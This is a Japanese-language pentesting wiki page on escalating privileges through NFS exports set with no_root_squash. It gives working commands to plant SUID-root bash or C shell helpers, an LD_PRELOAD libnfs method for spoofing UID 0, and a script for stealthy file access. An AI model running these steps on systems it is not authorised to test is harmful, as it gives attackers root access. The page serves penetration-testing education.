# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing の基本情報

NFS AUTH_SYS/AUTH_UNIX では、server は各 RPC request で提供された `uid` と `gid` に基づいて file-permission checks を行います。Kerberos などの他の security flavor では異なる credentials が使用され、server は permissions を確認する前に数値 credentials を mapping できます。<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: すべての UID と GID を anonymous account に mapping します。Linux ではデフォルトで `nobody` (65534) です。`no_all_squash` は root 以外の requests に対する default です。<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux での default で、UID/GID 0 (root) の requests を anonymous account に mapping します。それ以外の UIDs と GIDs は squash されません。<sup>[[4]](#references)</sup>
- **`no_root_squash`**: root squashing を無効にするため、UID/GID 0 の requests は server 上で root として評価できます。<sup>[[4]](#references)</sup>

許可された client が、**`no_root_squash`** を設定した writable export を **`/etc/exports`** 内で mount できる場合、その UID/GID 0 の requests により、server の root user としてそこへ write できます。<sup>[[4]](#references)</sup>

**NFS** の詳細については、以下を確認してください:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

bash を使用する Option 1:
- 許可された client 上で writable export を root として mount し、**`/bin/bash`** をそこへ copy して **SUID** bit を設定し、`nosuid` を使用していない victim mount から実行します。<sup>[[2]](#references)[[4]](#references)</sup>
- upload した file の owner を root のまま維持するには、server が **`no_root_squash`** を使用している必要があります。root が squash される場合、別の account 用の SUID binary を作成できるのは、client がその account の numeric UID/GID で正当に作成または所有できる場合に限られます。<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2：コンパイル済み C コードを使用する場合：
- 許可された client から directory を mount し、SUID permissions を悪用するコンパイル済み payload をコピーして、**SUID** bit を設定し、victim 上から実行します（いくつかの [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) を参照）。
- 以前と同じ制限。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### ローカル Exploit

> [!TIP]
> **自分のマシンから victim machine への tunnel を作成できる場合、必要な port を tunnelling することで、Remote version を使用してこの privilege escalation を exploit できる**ことに注意してください。\
> 次の trick は、`/etc/exports` が export 先を victim の IP に制限している場合に役立ちます。remote client はそれを mount できませんが、local technique なら、許可された host にすでに mount されている share を介して動作できます。<sup>[[2]](#references)</sup>\
> この unprivileged libnfs method では、process が non-reserved source port を使用できるように、**`/etc/exports`** の export で `insecure` flag を使用する必要があります。デフォルトは `secure` ですが、reserved port に bind できる process ではこの option は必要ありません。<sup>[[1]](#references)[[4]](#references)</sup>

### 基本情報

NFSv3 AUTH_UNIX client は、各 call に effective UID、GID、および groups を含め、server はそれらを permission checks に使用します。この local technique は、[libnfs](https://github.com/sahlberg/libnfs) を介して RPC credentials を偽装することで、この model を悪用します。その preload module は、NFS context 内の UID/GID の override をサポートしています。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### ライブラリのコンパイル

libnfs の example では target kernel に合わせた調整が必要になる場合があります。ここで使用する walkthrough では、preload module を compile する前に fallocate syscalls を comment out する必要があると明記されています。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit の実行

この例では、shell を起動する小さな C helper を作成し、それを share に配置して、NFS context で UID 0 の `ld_nfs.so` を使用し、SUID-root にします。<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit code を Compile する：**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **exploit を share に配置し、UID を偽装してその permissions を変更する**。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **root 権限を取得するため exploit を実行する**。<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: Stealthy File Access のための NFShell

root access を取得した後、この `nfsh.py` パターンはコマンドを実行する前に effective UID を対象ファイルの UID に設定するため、所有権を再帰的に変更せずにアクセスできます。<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
次のように実行します:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [あまり知られていない NFS privesc の話](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 プロトコル仕様](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
